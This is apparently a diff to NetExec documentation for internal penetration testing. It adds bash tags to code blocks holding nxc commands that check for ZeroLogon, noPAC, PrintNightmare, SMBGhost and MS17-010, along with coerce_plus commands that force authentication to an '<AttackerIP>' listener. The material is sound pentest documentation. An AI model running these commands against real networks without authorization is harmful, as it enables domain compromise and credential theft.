@@ -10,13 +10,13 @@ When you start your internal pentest, these are the first modules you should try
 
 #### ZeroLogon
 
-```
+```bash
 nxc smb <ip> -u '' -p '' -M zerologon
 ```
 
 #### noPAC
 
-```
+```bash
 nxc smb <ip> -u 'user' -p 'pass' -M nopac
 ```
 
@@ -26,19 +26,19 @@ You need a credential for noPAC vulnerability check.
 
 #### PrintNightmare
 
-```
+```bash
 nxc smb <ip> -u '' -p '' -M printnightmare
 ```
 
 #### SMBGhost
 
-```
+```bash
 nxc smb <ip> -u '' -p '' -M smbghost
 ```
 
 #### MS17-010 (Not tested outside LAB environment)
 
-```
+```bash
 nxc smb <ip> -u '' -p '' -M ms17-010
 ```
 
@@ -48,25 +48,25 @@ Or, try them all at once! Just list each one: `-M zerologon -M printnightmare`
 
 You can check for coerce vulnerabilities such as PetitPotam, DFSCoerce, PrinterBug, MSEven and ShadowCoerce using the coerce\_plus module. You can also use credentials to check for these vulnerabilities. By default the LISTENER ip will be set to localhost, so no traffic will appear on the network.
 
-```
+```bash
 nxc smb <ip> -u '' -p '' -M coerce_plus
 ```
 
 If a vulnerability is found, you can set a LISTENER ip to coerce the connection.
 
-```
+```bash
 nxc smb <ip> -u '' -p '' -M coerce_plus -o LISTENER=<AttackerIP>
 ```
 
 To run all exploit methods at once, add the ALWAYS=true option, otherwise it will stop if the underlying RPC connection reports a successful coercion.
 
-```
+```bash
 nxc smb <ip> -u '' -p '' -M coerce_plus -o LISTENER=<AttackerIP> ALWAYS=true
 ```
 
 You can also check for a specific coerce method by specifying it:
 
-```
+```bash
 nxc smb <ip> -u '' -p '' -M coerce_plus -o METHOD=PetitPotam
 ```
 
